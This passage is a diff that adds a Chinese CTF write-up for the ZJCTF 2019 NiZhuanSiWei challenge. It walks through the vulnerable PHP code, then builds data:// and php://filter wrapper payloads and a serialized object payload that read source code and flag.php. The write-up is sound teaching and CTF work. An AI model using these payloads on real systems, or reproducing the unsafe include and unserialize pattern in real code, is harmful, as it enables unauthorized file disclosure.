@@ -935,6 +935,113 @@ SetHandler application/x-httpd-php
 
 原文链接：https://blog.csdn.net/m0_73734159/article/details/134399554?spm=1001.2014.3001.5501
 
+## 详解[ZJCTF 2019]NiZhuanSiWei 1（PHP两种伪协议、PHP反序列化漏洞、PHP强比较）还有那道题有这么经典？
+
+题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699963793416-8255475f-4de4-42a8-a718-f5d257ffad03.png#averageHue=%23fdfcfc&clientId=u01b9a614-d96f-4&from=paste&height=395&id=u31cb20af&originHeight=494&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38416&status=done&style=none&taskId=u1295fa4f-23f4-42bc-bc3b-e491613d732&title=&width=1536)
+```php
+<?php  
+  $text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+  echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+  if(preg_match("/flag/",$file)){
+    echo "Not now!";
+    exit(); 
+  }else{
+    include($file);  //useless.php
+    $password = unserialize($password);
+    echo $password;
+  }
+}
+else{
+  highlight_file(__FILE__);
+}
+?>
+```
+PHP代码审计
+> 三个通过GET方式传参的参数text、file、password
+> file_get_contents() 函数把整个文件读入一个字符串中。
+> 'r'代表读取内容
+> &&左右两边条件都要满足，===PHP强比较，类型和值都要相等
+> 满足第一个参数就会输出这段字符串
+> **从这里可以看出，需要用到PHP伪协议中的data协议**
+> 第二个参数file就是遇到的就是**正则匹配，**flag关键字被过滤了
+> 当出现flag关键字时，程序就会自动退出，不再进行
+> 反之，如果绕过正则的话，就包含咱们传给file参数的文件
+> 可以看出作者注释里面给的有一个文件，useless.php
+> 下面是对password参数进行反序列化
+> **从这里可以猜出，useless.php文件可能包含的是反序列化内容**
+> 然后file参数和password参数联系起来就一目了然了（这里正则并没有用可以直接绕过）
+> **猜测啊，file=useless.php，才能进入password参数那部分（后面可以给大家测试看看）**
+
+作者很贴心，打开题目给的有题目源码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699965044018-857fad73-a207-45a2-9afe-7ee60e1b5a43.png#averageHue=%23fdfdfd&clientId=u01b9a614-d96f-4&from=paste&height=630&id=ub82948e1&originHeight=788&originWidth=622&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61827&status=done&style=none&taskId=u521a75db-7e73-40ff-8400-91b72691748&title=&width=497.6)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699965130661-59a91f56-4889-4a05-b539-22443d218845.png#averageHue=%23fdfdfd&clientId=u01b9a614-d96f-4&from=paste&height=760&id=u6354e149&originHeight=950&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=101164&status=done&style=none&taskId=u3c5f7040-6a64-4392-a881-15fe5fe2906&title=&width=1528.8)<br />当然咱们还可以通过data伪协议和php://filter伪协议去查看useless.php的源码
+> php://filter伪协议详解文末会给链接
+> base64编解码文末也会给链接
+
+data协议规则：<br />`data://text/plain;编码格式,读取内容`<br />（注意一个是分号;命令拼接，和一个逗号,用来读取文本内容）
+> 如果要读取后边的文件内容，字符串也要进行相应的编码
+> 这里猜测useless.php文件是base64编码格式
+> 所以使用base64编码格式
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699965611693-234cb3de-f023-4340-8399-a3bbbdd978db.png#averageHue=%23fdfcfb&clientId=u01b9a614-d96f-4&from=paste&height=376&id=u65a787d8&originHeight=470&originWidth=1858&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45071&status=done&style=none&taskId=u0c80f959-788a-4c7d-b7bb-c32eabe0e90&title=&width=1486.4)<br />构造payload：<br />`?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699965852703-ae1533a3-6015-4eb6-b71e-6da7dc623e9a.png#averageHue=%23f9f8f6&clientId=u01b9a614-d96f-4&from=paste&height=280&id=u9d7af1f3&originHeight=350&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56822&status=done&style=none&taskId=u8666b584-ce35-4398-be63-a30d5c1a2aa&title=&width=1536)<br />送去base64解码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699965982123-ece08a80-a46d-4d32-9c72-e845665a4e7b.png#averageHue=%23fcfafa&clientId=u01b9a614-d96f-4&from=paste&height=377&id=u7b328f9c&originHeight=471&originWidth=1845&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47736&status=done&style=none&taskId=u3d0e6401-de69-4d90-8be0-3a360e3317b&title=&width=1476)<br />useless.php源代码
+```php
+<?php  
+
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+?> 
+```
+> 较为简单的序列化，直接给参数file赋值flag.php即可
+
+进行序列化
+```php
+<?php  
+
+class Flag{  //flag.php  
+    public $file='flag.php';  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+} 
+$flag=new Flag();
+echo serialize($flag);
+?> 
+```
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699966288185-7fc5aaa8-c623-48ee-afc5-263257a7cc54.png#averageHue=%23232625&clientId=u01b9a614-d96f-4&from=paste&height=649&id=u6611dfff&originHeight=811&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=114364&status=done&style=none&taskId=u40f70be2-5673-411b-bd3d-17eacfc76ad&title=&width=1536)<br />构造最终payload：<br />`?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`<br />上传payload：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699966583634-9d1901c5-a16d-44bf-9b3b-572f71ff66d2.png#averageHue=%23fbfbfa&clientId=u01b9a614-d96f-4&from=paste&height=340&id=u37923332&originHeight=425&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42977&status=done&style=none&taskId=ua06582ee-4ae6-444f-abb8-1be54725b2b&title=&width=1536)
+> 这里表明三个参数都已符合了条件
+
+F12查看源码：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699966715532-732fe627-50d1-4ffc-8919-b2093c800e9a.png#averageHue=%23fbfafa&clientId=u01b9a614-d96f-4&from=paste&height=306&id=u920714f4&originHeight=382&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42431&status=done&style=none&taskId=u00dfb23c-9dd9-41af-a3fd-708484726c2&title=&width=1534.4)<br />**得到flag：**<br />`flag{8fa13eb3-db41-4230-be27-634236f2fe1b}`
+> 这里再说明以下，为什么给file参数赋值useless.php，因为你进入了useless.php才能进入password参数那一步！
+> 同时也绕过了正则
+
+我们可以测试一下给file参数传inde.php文件会怎样<br />payload：<br />`?text=data://text/plain,welcome to the zjctf&file=index.php`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699966979949-90d34ebb-c2dc-42a2-ab6e-a69c3db20545.png#averageHue=%23fafafa&clientId=u01b9a614-d96f-4&from=paste&height=816&id=uae704717&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93708&status=done&style=none&taskId=ue1dbd814-de24-40c9-9e24-5fef30914f9&title=&width=1536)<br />`?text=data://text/plain,welcome to the zjctf&file=index.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699967135889-5ed5ab4c-a19b-4a4a-95e7-472a70391083.png#averageHue=%23fafafa&clientId=u01b9a614-d96f-4&from=paste&height=826&id=uccd4524a&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105488&status=done&style=none&taskId=uf4977a7c-7a3f-49c7-8f0a-4b2a7048c70&title=&width=1536)
+> 可以看出，当参数file赋值为index.php文件的时候，一直执行的是index代码内容
+> 那么当参数file赋值为useless.php文件的时候，才会去执行参数password的内容
+
+> **php://filter伪协议可参考：**[https://blog.csdn.net/m0_73734159/article/details/130383801?spm=1001.2014.3001.5501](https://blog.csdn.net/m0_73734159/article/details/130383801?spm=1001.2014.3001.5501)
+> **PHP序列化魔法函数可参考：**[https://blog.csdn.net/m0_73734159/article/details/133854073?spm=1001.2014.3001.5502](https://blog.csdn.net/m0_73734159/article/details/133854073?spm=1001.2014.3001.5502)
+> **PHP强比较可参考：**[**https://blog.csdn.net/m0_73734159/article/details/134349129?spm=1001.2014.3001.5501**](https://blog.csdn.net/m0_73734159/article/details/134349129?spm=1001.2014.3001.5501)
+> **base64编码解码网站：**[https://c.runoob.com/front-end/693/](https://c.runoob.com/front-end/693/)
+> **【Kali终端也可通过命令进行base64解码】（echo "bae64编码内容" | base64 -d）**
+
+原文链接：https://blog.csdn.net/m0_73734159/article/details/134408344?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134408344%22%2C%22source%22%3A%22m0_73734159%22%7D
+
+
+
+
 
 
 
